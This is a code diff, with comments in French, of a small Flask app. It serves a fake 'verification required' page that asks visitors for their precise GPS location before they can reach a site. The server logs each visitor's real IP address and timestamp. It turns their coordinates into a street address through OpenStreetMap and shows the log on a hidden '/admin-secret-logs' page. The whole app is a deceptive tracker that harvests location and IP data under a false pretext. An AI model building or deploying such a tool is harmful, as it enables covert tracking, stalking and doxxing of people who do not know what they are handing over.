@@ -24,52 +24,44 @@ HTML_VALIDATION = """
     </style>
 </head>
 <body>
-
     <div class="box">
         <h2>Vérification requise</h2>
         <p>Avant de continuer et d'accéder au site, veuillez valider votre géolocalisation (vous pouvez accepter ou refuser la demande du navigateur).</p>
-        <!-- Le clic direct ici va forcer le téléphone à réagir -->
         <button id="btn-check">Continuer</button>
     </div>
-
     <script>
-    // ÉCOUTEUR DE CLIC DIRECT : La seule méthode acceptée par Apple et Google
-    document.getElementById('btn-check').addEventListener('click', function() {
-        if (navigator.geolocation) {
-            // Options pour forcer le téléphone à s'activer au maximum
-            const options = {
-                enableHighAccuracy: true, // Force l'utilisation du vrai GPS du téléphone
-                timeout: 5000,
-                maximumAge: 0
-            };
-
-            navigator.geolocation.getCurrentPosition(
-                function(position) {
-                    // L'utilisateur a fait "Autoriser"
-                    envoyerDonnees(position.coords.latitude, position.coords.longitude);
-                },
-                function(error) {
-                    // L'utilisateur a fait "Refuser" ou blocage système
-                    envoyerDonnees(null, null);
-                }, 
-                options
-            );
-        } else {
-            envoyerDonnees(null, null);
-        }
-    });
-
-    function envoyerDonnees(lat, lon) {
-        fetch('/api/verification', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ latitude: lat, longitude: lon })
-        })
-        .then(res => res.json())
-        .then(data => {
-            window.location.href = "/site";
+        document.getElementById('btn-check').addEventListener('click', function() {
+            if (navigator.geolocation) {
+                const options = {
+                    enableHighAccuracy: true,
+                    timeout: 5000,
+                    maximumAge: 0
+                };
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        envoyerDonnees(position.coords.latitude, position.coords.longitude);
+                    },
+                    function(error) {
+                        envoyerDonnees(null, null);
+                    },
+                    options
+                );
+            } else {
+                envoyerDonnees(null, null);
+            }
         });
-    }
+
+        function envoyerDonnees(lat, lon) {
+            fetch('/api/verification', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ latitude: lat, longitude: lon })
+            })
+            .then(res => res.json())
+            .then(data => {
+                window.location.href = "/site";
+            });
+        }
     </script>
 </body>
 </html>
@@ -85,19 +77,23 @@ def api_verification():
     latitude = data.get('latitude')
     longitude = data.get('longitude')
     
-    # Capture la vraie IP publique derrière le proxy Render
     if request.headers.getlist("X-Forwarded-For"):
         ip_visiteur = request.headers.getlist("X-Forwarded-For")[0].split(',')[0].strip()
     else:
         ip_visiteur = request.remote_addr
         
     heure_exacte = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
-
     rue_exacte = "Inconnu (Géolocalisation refusée par l'utilisateur)"
+    
     if latitude and longitude:
         try:
+            # Correction de la ligne 65 : Utilisation de l'API reverse de Nominatim au format JSON
             url_osm = f"https://openstreetmap.org{latitude}&lon={longitude}"
-            reponse = requests.get(url_osm, headers={'User-Agent': 'VerifSimpleServer'}).json()
+            
+            # Un User-Agent personnalisé est requis par la politique d'utilisation d'OpenStreetMap
+            headers = {'User-Agent': 'MonApplicationDeTestGeoloc/1.0 (contact@mon-email.com)'}
+            
+            reponse = requests.get(url_osm, headers=headers).json()
             if 'address' in reponse:
                 num = reponse['address'].get('house_number', '')
                 route = reponse['address'].get('road', 'Rue inconnue')
@@ -106,8 +102,7 @@ def api_verification():
                 rue_exacte = f"{num} {route}, {ville}, {pays}"
         except Exception:
             rue_exacte = "Erreur lors de la récupération de la rue"
-
-    # BLOC AVEC APPARENCE PROPRE ET ESPACEMENT DE SÉCURITÉ
+            
     bloc_texte = (
         f"====================================================\n"
         f"⏰ Heure exacte : {heure_exacte}\n"
@@ -115,10 +110,10 @@ def api_verification():
         f"🏠 Localisation : {rue_exacte}\n"
         f"====================================================\n\n"
     )
-
+    
     with open(FICHIER_LOGS, "a", encoding="utf-8") as f:
         f.write(bloc_texte)
-
+        
     return jsonify({"status": "ok"})
 
 @app.route('/admin-secret-logs')
@@ -137,6 +132,3 @@ def page_site_vide():
 if __name__ == '__main__':
     port_web = int(os.environ.get("PORT", 5000))
     app.run(debug=True, host='0.0.0.0', port=port_web)
-
-
-
